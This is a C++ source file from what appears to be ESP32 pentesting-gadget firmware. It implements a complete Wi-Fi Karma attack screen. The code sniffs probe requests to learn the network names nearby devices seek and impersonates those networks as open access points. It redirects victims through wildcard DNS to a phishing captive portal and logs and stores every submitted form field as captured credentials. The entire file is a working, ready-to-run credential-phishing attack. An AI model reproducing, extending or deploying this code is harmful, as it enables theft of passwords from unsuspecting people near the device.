#include "WifiKarmaScreen.h"
#include "core/Device.h"
#include "core/ScreenManager.h"
#include "screens/wifi/WifiMenuScreen.h"
#include "ui/actions/ShowStatusAction.h"
#include "ui/actions/InputNumberAction.h"
#include "utils/StorageUtil.h"

#include <WiFi.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>

WifiKarmaScreen* WifiKarmaScreen::_instance = nullptr;

// ── Destructor ──────────────────────────────────────────────────────────────

WifiKarmaScreen::~WifiKarmaScreen()
{
  _stopAttack();
  _instance = nullptr;
}

// ── Lifecycle ───────────────────────────────────────────────────────────────

void WifiKarmaScreen::onInit()
{
  _instance = this;
  _showMenu();
}

void WifiKarmaScreen::onItemSelected(uint8_t index)
{
  if (_state == STATE_MENU) {
    switch (index) {
      case 0:
        _saveList = !_saveList;
        _saveListSub = _saveList ? "On" : "Off";
        _menuItems[0].sublabel = _saveListSub.c_str();
        render();
        break;
      case 1: _selectPortal(); break;
      case 2: {
        int val = InputNumberAction::popup("Wait Connect (s)", 5, 120, _waitConnect);
        if (val >= 5) _waitConnect = val;
        _showMenu();
        break;
      }
      case 3: {
        int val = InputNumberAction::popup("Wait Input (s)", 10, 600, _waitInput);
        if (val >= 10) _waitInput = val;
        _showMenu();
        break;
      }
      case 4: _startAttack(); break;
    }
  } else if (_state == STATE_SELECT_PORTAL && index < _portalCount) {
    _portalFolder = _portalNames[index];
    _showMenu();
  }
}

void WifiKarmaScreen::onUpdate()
{
  if (_state != STATE_RUNNING) {
    ListScreen::onUpdate();
    return;
  }


  // Handle exit
  if (Uni.Nav->wasPressed()) {
    const auto dir = Uni.Nav->readDirection();
    if (dir == INavigation::DIR_BACK || dir == INavigation::DIR_PRESS) {
      _stopAttack();
      _showMenu();
      return;
    }
  }

  // DNS
  if (_dns) _dns->processNextRequest();

  unsigned long now = millis();

  if (_apActive) {
    int clients = WiFi.softAPgetStationNum();

    // Client just connected
    if (clients > 0 && !_clientConnected) {
      _clientConnected = true;
      _inputStartTime = now;
      char buf[60];
      snprintf(buf, sizeof(buf), "[+] Client connected to: %s", _ssids[_currentIdx]);
      _addLog(buf);
      if (Uni.Speaker) Uni.Speaker->playNotification();
    }

    // Phase 1: waiting for device to connect (no client yet)
    if (!_clientConnected) {
      if (now - _apStartTime > (unsigned long)_waitConnect * 1000) {
        char buf[60];
        snprintf(buf, sizeof(buf), "[-] Timeout: %s", _ssids[_currentIdx]);
        _addLog(buf);
        _blacklistSSID(_ssids[_currentIdx]);
        _teardownAP();
        _currentIdx++;
      }
    }
    // Phase 2: client connected, waiting for form input
    else {
      if (now - _inputStartTime > (unsigned long)_waitInput * 1000) {
        char buf[60];
        snprintf(buf, sizeof(buf), "[-] Input timeout: %s", _ssids[_currentIdx]);
        _addLog(buf);
        _blacklistSSID(_ssids[_currentIdx]);
        _teardownAP();
        _currentIdx++;
      }
    }
  }

  // Deploy next available SSID if AP is not active
  if (!_apActive) {
    while (_currentIdx < _ssidCount) {
      if (!_isBlacklisted(_ssids[_currentIdx])) {
        _deployAP(_ssids[_currentIdx]);
        break;
      }
      _currentIdx++;
    }
  }

  // Redraw
  if (now - _lastDraw > 500) {
    _drawLog();
    _lastDraw = now;
  }
}

void WifiKarmaScreen::onBack()
{
  if (_state == STATE_SELECT_PORTAL) {
    _showMenu();
  } else if (_state == STATE_RUNNING) {
    _stopAttack();
    _showMenu();
  } else {
    Screen.setScreen(new WifiMenuScreen());
  }
}

// ── Menu ────────────────────────────────────────────────────────────────────

void WifiKarmaScreen::_showMenu()
{
  _state = STATE_MENU;
  _saveListSub    = _saveList ? "On" : "Off";
  _portalSub      = _portalFolder.isEmpty() ? "-" : _portalFolder;
  _waitConnectSub = String(_waitConnect) + "s";
  _waitInputSub   = String(_waitInput) + "s";

  _menuItems[0] = {"Save WiFi List",  _saveListSub.c_str()};
  _menuItems[1] = {"Captive Portal",  _portalSub.c_str()};
  _menuItems[2] = {"Waiting Time",    _waitConnectSub.c_str()};
  _menuItems[3] = {"Waiting Input",   _waitInputSub.c_str()};
  _menuItems[4] = {"Start"};
  setItems(_menuItems, 5);
}

// ── Portal Selection ────────────────────────────────────────────────────────

void WifiKarmaScreen::_selectPortal()
{
  _state = STATE_SELECT_PORTAL;

  if (!Uni.Storage || !Uni.Storage->isAvailable()) {
    ShowStatusAction::show("No storage available");
    _showMenu();
    return;
  }

  IStorage::DirEntry entries[MAX_PORTALS];
  uint8_t count = Uni.Storage->listDir("/unigeek/wifi/portals", entries, MAX_PORTALS);

  _portalCount = 0;
  for (int i = 0; i < count && _portalCount < MAX_PORTALS; i++) {
    if (entries[i].isDir) {
      _portalNames[_portalCount] = entries[i].name;
      _portalItems[_portalCount] = {_portalNames[_portalCount].c_str()};
      _portalCount++;
    }
  }

  if (_portalCount == 0) {
    ShowStatusAction::show("No portals found\nWiFi > Network > Download\n> Firmware Sample Files");
    _showMenu();
    return;
  }

  setItems(_portalItems, _portalCount);
}

// ── Portal HTML ─────────────────────────────────────────────────────────────

void WifiKarmaScreen::_loadPortalHtml()
{
  _portalBasePath = "";
  if (!_portalFolder.isEmpty() && Uni.Storage && Uni.Storage->isAvailable()) {
    _portalBasePath = "/unigeek/wifi/portals/" + _portalFolder;
    String path = _portalBasePath + "/index.htm";
    if (Uni.Storage->exists(path.c_str())) {
      _portalHtml = Uni.Storage->readFile(path.c_str());
      String successPath = _portalBasePath + "/success.htm";
      if (Uni.Storage->exists(successPath.c_str())) {
        _successHtml = Uni.Storage->readFile(successPath.c_str());
      } else {
        _successHtml = "<html><body><h2>Connected!</h2></body></html>";
      }
      return;
    }
  }
  _portalBasePath = "";
  _portalHtml  = "";
  _successHtml = "";
}

// ── Probe Sniffer ───────────────────────────────────────────────────────────

void IRAM_ATTR WifiKarmaScreen::_promiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type)
{
  if (type != WIFI_PKT_MGMT || !_instance) return;

  const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* frame = pkt->payload;

  // Probe Request: frame type 0x40
  if (frame[0] != 0x40) return;

  uint8_t ssidLen = frame[25];
  if (ssidLen < 1 || ssidLen > 32) return;

  char ssid[33];
  memcpy(ssid, &frame[26], ssidLen);
  ssid[ssidLen] = '\0';

  // Skip empty/whitespace SSIDs
  bool allSpace = true;
  for (int i = 0; i < ssidLen; i++) {
    if (ssid[i] != ' ') { allSpace = false; break; }
  }
  if (allSpace) return;

  _instance->_onProbe(ssid);
}

void WifiKarmaScreen::_onProbe(const char* ssid)
{
  // Dedup check
  for (int i = 0; i < _ssidCount; i++) {
    if (strcmp(_ssids[i], ssid) == 0) return;
  }

  // Skip if blacklisted
  if (_isBlacklisted(ssid)) return;

  if (_ssidCount >= MAX_SSIDS) return;

  strncpy(_ssids[_ssidCount], ssid, 32);
  _ssids[_ssidCount][32] = '\0';
  _ssidCount++;
  _capturedCount++;

  char buf[60];
  snprintf(buf, sizeof(buf), "[*] Probe: %s", ssid);
  _addLog(buf);

  if (_saveList) _saveSSIDToFile(ssid);
}

void WifiKarmaScreen::_startSniffing()
{
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  delay(200);

  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&_promiscuousCb);

  _addLog("[*] Sniffing probes...");
}

void WifiKarmaScreen::_stopSniffing()
{
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);
}

// ── AP Deployment ───────────────────────────────────────────────────────────

void WifiKarmaScreen::_deployAP(const char* ssid)
{
  _stopSniffing();

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(ssid, NULL, 1, 0, 4);
  delay(100);

  IPAddress apIP = WiFi.softAPIP();

  if (!_dns) {
    _dns = new DNSServer();
    _dns->start(53, "*", apIP);
  }

  if (!_server) {
    _setupWebServer();
  }

  _apActive = true;
  _apStartTime = millis();
  _clientConnected = false;

  char buf[60];
  snprintf(buf, sizeof(buf), "[>] AP: %s (%ds)", ssid, _waitConnect);
  _addLog(buf);
}

void WifiKarmaScreen::_teardownAP()
{
  if (_server) {
    _server->end();
    delete _server;
    _server = nullptr;
  }
  if (_dns) {
    _dns->stop();
    delete _dns;
    _dns = nullptr;
  }

  WiFi.softAPdisconnect(true);
  _apActive = false;
  _clientConnected = false;

  _startSniffing();
}

void WifiKarmaScreen::_setupWebServer()
{
  _server = new AsyncWebServer(80);

  auto servePortalSilent = [this](AsyncWebServerRequest* req) {
    if (_portalHtml.length() > 0)
      req->send(200, "text/html", _portalHtml);
    else
      req->send(200, "text/html", "<html><body><h2>Connected</h2></body></html>");
  };

  _server->on("/", HTTP_GET, [this](AsyncWebServerRequest* req) {
    _visitCount++;
    char buf[60];
    snprintf(buf, sizeof(buf), "[+] Visit %s", req->client()->remoteIP().toString().c_str());
    _addLog(buf);
    if (_portalHtml.length() > 0)
      req->send(200, "text/html", _portalHtml);
    else
      req->send(200, "text/html", "<html><body><h2>Connected</h2></body></html>");
  });
  _server->on("/generate_204", HTTP_GET, servePortalSilent);
  _server->on("/fwlink", HTTP_GET, servePortalSilent);
  _server->on("/hotspot-detect.html", HTTP_GET, servePortalSilent);
  _server->on("/connecttest.txt", HTTP_GET, servePortalSilent);

  // Handle POST — capture credentials
  _server->on("/", HTTP_POST, [this](AsyncWebServerRequest* req) {
    String data;
    for (int i = 0; i < (int)req->params(); i++) {
      const AsyncWebParameter* p = req->getParam(i);
      if (!p->isPost()) continue;
      if (data.length() > 0) data += "\n";
      data += p->name() + "=" + p->value();
    }
    _postCount++;

    char buf[60];
    snprintf(buf, sizeof(buf), "[+] POST %s", req->client()->remoteIP().toString().c_str());
    _addLog(buf);

    _saveCaptured(data);
    _inputStartTime = millis();
    req->send(200, "text/html", _successHtml.length() > 0 ? _successHtml
      : String("<html><body><h2>Connected!</h2></body></html>"));
  });

  // Serve static files from portal folder
  if (Uni.Storage && Uni.Storage->isAvailable() && !_portalBasePath.isEmpty()) {
    _server->serveStatic("/", Uni.Storage->getFS(), _portalBasePath.c_str());
  }

  _server->onNotFound([](AsyncWebServerRequest* req) {
    req->redirect("/");
  });

  _server->begin();
}

// ── Start / Stop ────────────────────────────────────────────────────────────

void WifiKarmaScreen::_startAttack()
{
  if (_portalFolder.isEmpty()) {
    ShowStatusAction::show("Select a portal first!");
    return;
  }
  if (!StorageUtil::hasSpace()) {
    ShowStatusAction::show("Storage full! (<20KB free)");
    return;
  }

  _state = STATE_RUNNING;
  _logCount       = 0;
  _ssidCount      = 0;
  _blacklistCount = 0;
  _currentIdx     = 0;
  _capturedCount  = 0;
  _visitCount     = 0;
  _postCount      = 0;
  _apActive       = false;
  _lastDraw       = 0;

  _loadPortalHtml();
  _addLog("[*] Karma Attack started");
  _addLog("[*] BACK/Press to stop");
  _startSniffing();

  _drawLog();
}

void WifiKarmaScreen::_stopAttack()
{
  _stopSniffing();

  if (_server) {
    _server->end();
    delete _server;
    _server = nullptr;
  }
  if (_dns) {
    _dns->stop();
    delete _dns;
    _dns = nullptr;
  }
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_OFF);

  _apActive       = false;
  _clientConnected = false;
  _ssidCount      = 0;
  _blacklistCount = 0;
  _currentIdx     = 0;
  _portalHtml     = "";
  _successHtml    = "";
  _portalBasePath = "";
}

// ── Save to file ────────────────────────────────────────────────────────────

void WifiKarmaScreen::_saveSSIDToFile(const char* ssid)
{
  if (!Uni.Storage || !Uni.Storage->isAvailable()) return;
  if (!StorageUtil::hasSpace()) {
    _addLog("[!] Storage full, skip save");
    return;
  }

  Uni.Storage->makeDir("/unigeek/wifi/captives");
  String path = "/unigeek/wifi/captives/karma_ssid.txt";

  char line[80];
  struct tm timeinfo;
  if (getLocalTime(&timeinfo, 0)) {
    char ts[20];
    strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", &timeinfo);
    snprintf(line, sizeof(line), "%s:%s", ts, ssid);
  } else {
    snprintf(line, sizeof(line), "%lu:%s", millis() / 1000, ssid);
  }

  fs::File f = Uni.Storage->open(path.c_str(), FILE_APPEND);
  if (f) {
    f.println(line);
    f.close();
  }
}

void WifiKarmaScreen::_saveCaptured(const String& data)
{
  _addLog("[+] Credential captured!");
  if (Uni.Speaker) Uni.Speaker->playNotification();

  if (!Uni.Storage || !Uni.Storage->isAvailable()) return;
  if (!StorageUtil::hasSpace()) {
    _addLog("[!] Storage full, skip save");
    return;
  }

  Uni.Storage->makeDir("/unigeek/wifi/captives");

  String ssid = (_currentIdx < _ssidCount) ? String(_ssids[_currentIdx]) : "unknown";
  String filename = "/unigeek/wifi/captives/karma_" + ssid + ".txt";

  fs::File f = Uni.Storage->open(filename.c_str(), FILE_APPEND);
  if (f) {
    f.println("---");
    f.println(data);
    f.close();
  }
}

// ── Blacklist ───────────────────────────────────────────────────────────────

bool WifiKarmaScreen::_isBlacklisted(const char* ssid)
{
  for (int i = 0; i < _blacklistCount; i++) {
    if (strcmp(_blacklist[i], ssid) == 0) return true;
  }
  return false;
}

void WifiKarmaScreen::_blacklistSSID(const char* ssid)
{
  if (_blacklistCount >= MAX_SSIDS) return;
  strncpy(_blacklist[_blacklistCount], ssid, 32);
  _blacklist[_blacklistCount][32] = '\0';
  _blacklistCount++;
}

// ── Log Display ─────────────────────────────────────────────────────────────

void WifiKarmaScreen::_addLog(const char* msg)
{
  if (_logCount < MAX_LOG) {
    strncpy(_logLines[_logCount], msg, 59);
    _logLines[_logCount][59] = '\0';
    _logCount++;
  } else {
    for (int i = 0; i < MAX_LOG - 1; i++) {
      memcpy(_logLines[i], _logLines[i + 1], 60);
    }
    strncpy(_logLines[MAX_LOG - 1], msg, 59);
    _logLines[MAX_LOG - 1][59] = '\0';
  }
}

void WifiKarmaScreen::_drawLog()
{
  TFT_eSprite sp(&Uni.Lcd);
  sp.createSprite(bodyW(), bodyH());
  sp.fillSprite(TFT_BLACK);

  int lineH    = 10;
  int statusH  = 14;
  int logAreaH = bodyH() - statusH;
  int maxVisible = logAreaH / lineH;
  int startIdx   = _logCount > maxVisible ? _logCount - maxVisible : 0;

  sp.setTextDatum(TL_DATUM);
  sp.setTextColor(TFT_WHITE, TFT_BLACK);
  for (int i = startIdx; i < _logCount; i++) {
    int y = (i - startIdx) * lineH;
    sp.drawString(_logLines[i], 2, y, 1);
  }

  // Separator
  int sepY = bodyH() - statusH;
  sp.drawFastHLine(0, sepY, bodyW(), TFT_DARKGREY);

  // Status bar: AP:X  V:X  P:X  | current SSID
  int barY = sepY + 2;
  sp.setTextColor(TFT_GREEN, TFT_BLACK);
  sp.setTextDatum(TL_DATUM);

  char stats[40];
  snprintf(stats, sizeof(stats), "AP:%d V:%d P:%d", _capturedCount, _visitCount, _postCount);
  sp.drawString(stats, 2, barY, 1);

  sp.setTextDatum(TR_DATUM);
  if (_apActive && _currentIdx < _ssidCount) {
    sp.drawString(String(_ssids[_currentIdx]).substring(0, 14), bodyW() - 2, barY, 1);
  } else {
    sp.drawString("Sniffing...", bodyW() - 2, barY, 1);
  }

  sp.pushSprite(bodyX(), bodyY());
  sp.deleteSprite();
}